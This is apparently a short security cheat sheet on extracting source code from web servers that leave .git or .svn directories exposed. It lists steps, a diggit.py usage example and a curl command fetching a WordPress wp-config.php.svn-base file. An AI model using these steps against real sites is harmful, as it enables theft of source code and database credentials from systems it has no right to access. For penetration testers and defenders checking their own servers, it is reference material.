# GIT - Source management

Github example
1. Check 403 error (Forbidden) for .git

2. Git saves all informations in log file .git/logs/HEAD (try 'head' too)
```
0000000000000000000000000000000000000000 07603070376d63d911f608120eb4b5489b507692 
bloorq@gmail.com <bloorq@gmail.com> 1452195279 +0000    commit (initial): index.php initial commit
```

3. Acces the commit based on the hash -> a directory name (first two signs from hash) and filename (rest of it).git/objects/07/603070376d63d911f608120eb4b5489b507692, 

4. Use diggit.py
```
./diggit.py -u remote_git_repo -t temp_folder -o object_hash [-r=True]
./diggit.py -u http://webpage.com -t /path/to/temp/folder/ -o d60fbeed6db32865a1f01bb9e485755f085f51c1

-u is remote path, where .git folder exists
-t is path to local folder with dummy Git repository and where blob content (files) are saved with their real names (cd /path/to/temp/folder && git init)
-o is a hash of particular Git object to download
```

# SVN - Source management
SVN example (Wordpress)
```
curl http://blog.domain.com/.svn/text-base/wp-config.php.svn-base
```

1. Download the svn database
http://server/path_to_vulnerable_site/.svn/wc.db
```
INSERT INTO "NODES" VALUES(1,'trunk/test.txt',0,'trunk',1,'trunk/test.txt',2,'normal',NULL,NULL,'file',X'2829',NULL,'$sha1$945a60e68acc693fcb74abadb588aac1a9135f62',NULL,2,1456056344886288,'bl4de',38,1456056261000000,NULL,NULL);
```

2. Download interesting files
remove $sha1$ prefix
add .svn-base postfix
use first two signs from hash as folder name inside pristine/ directory (94 in this case)
create complete path, which will be: http://server/path_to_vulnerable_site/.svn/pristine/94/945a60e68acc693fcb74abadb588aac1a9135f62.svn-base


## Thanks to
* bl4de, https://github.com/bl4de/research/tree/master/hidden_directories_leaks
* bl4de, https://github.com/bl4de/security-tools/tree/master/diggit